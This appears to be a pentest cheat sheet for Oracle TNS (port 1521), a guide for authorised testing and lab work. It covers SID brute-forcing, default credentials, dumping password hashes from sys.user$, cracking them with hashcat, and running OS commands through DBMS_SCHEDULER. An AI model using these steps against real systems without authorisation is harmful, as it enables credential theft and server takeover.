# Oracle TNS (1521)

!!! tip "Start here"
    Enumerate SIDs first — you can't connect without one: `odat.py sidguesser -s 10.10.10.10`. Once you have a SID, try default credentials: `SCOTT:tiger`, `SYS:oracle`, `SYSTEM:manager`. Connect with `sqlplus <user>/<pass>@10.10.10.10:1521/<SID>`.

---

## Enumeration

```bash
nmap -p 1521 --script oracle-tns-version,oracle-sid-brute 10.10.10.10
```

---

## SID Enumeration

```bash
odat.py sidguesser -s 10.10.10.10
odat.py passwordguesser -s 10.10.10.10 -d <SID>
```

---

## Authentication

```bash
sqlplus <user>/<pass>@10.10.10.10:1521/<SID>
```

Default credentials to try:

```
SCOTT:tiger
SYS:oracle
SYSTEM:manager
HR:hr
DBSNMP:dbsnmp
```

---

## Post-Auth Enumeration

```sql
SELECT * FROM session_privs;                                      -- current privileges
SELECT username, account_status FROM dba_users WHERE account_status='OPEN';
SELECT * FROM dba_db_links;                                       -- linked databases
SELECT name, password FROM sys.user$;                             -- password hashes
```

---

## Hash Cracking

```bash
hashcat -m 3100 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## OS Command Execution (DBA Required)

If the account has DBA privileges, schedule an OS command via DBMS_SCHEDULER:

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'cmd_job',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled    => FALSE);
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job', 2, 'id > /tmp/out.txt');
  DBMS_SCHEDULER.ENABLE('cmd_job');
END;
/
```

!!! tip "Real-world"
    Oracle is common in enterprise environments and often runs with overprivileged service accounts. SID enumeration is the critical first step — without the right SID, you can't authenticate at all. `SCOTT:tiger` is ancient but still shows up on legacy installations that were never hardened.
